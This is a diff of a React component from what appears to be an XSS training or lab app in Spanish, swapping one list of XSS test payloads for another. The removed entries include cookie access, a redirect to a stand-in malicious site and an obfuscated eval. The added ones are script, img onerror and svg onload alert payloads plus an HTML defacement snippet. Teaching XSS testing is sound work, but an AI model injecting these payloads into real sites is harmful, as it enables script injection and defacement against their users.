@@ -132,34 +132,34 @@ function Search() {
       <div className="card">
         <h2 className="card-title">🧪 Payloads de XSS para Probar</h2>
         
-        <h3>1. Alert Box Simple</h3>
+        <h3>1. Alert Box Simple con Número</h3>
         <div className="code-block">
-          <pre>{`<script>alert('XSS Vulnerable!')</script>`}</pre>
+          <pre>{`<script>alert(1)</script>`}</pre>
         </div>
 
-        <h3>2. Robo de Cookies</h3>
+        <h3>2. Alert Box con Texto</h3>
         <div className="code-block">
-          <pre>{`<script>alert(document.cookie)</script>`}</pre>
+          <pre>{`<script>alert("XSS")</script>`}</pre>
         </div>
 
-        <h3>3. Redirección Maliciosa</h3>
+        <h3>3. Imagen con Event Handler</h3>
         <div className="code-block">
-          <pre>{`<script>window.location='http://malicious-site.com'</script>`}</pre>
+          <pre>{`<img src=x onerror=alert(1)>`}</pre>
         </div>
 
-        <h3>4. Inyección de HTML</h3>
+        <h3>4. SVG con onload</h3>
         <div className="code-block">
-          <pre>{`<img src=x onerror=alert('XSS')>`}</pre>
+          <pre>{`<svg onload=alert(1)>`}</pre>
         </div>
 
-        <h3>5. Event Handler XSS</h3>
+        <h3>5. XSS con Entidades HTML</h3>
         <div className="code-block">
-          <pre>{`<svg onload=alert('XSS')>`}</pre>
+          <pre>{`<script>alert(&#39;XSS&#39;)</script>`}</pre>
         </div>
 
-        <h3>6. XSS con Decodificación HTML</h3>
+        <h3>6. Inyección de Contenido HTML</h3>
         <div className="code-block">
-          <pre>{`<img src="x" onerror="eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))">`}</pre>
+          <pre>{`<h1 style="color:red">¡Sitio Hackeado!</h1>`}</pre>
         </div>
       </div>
 
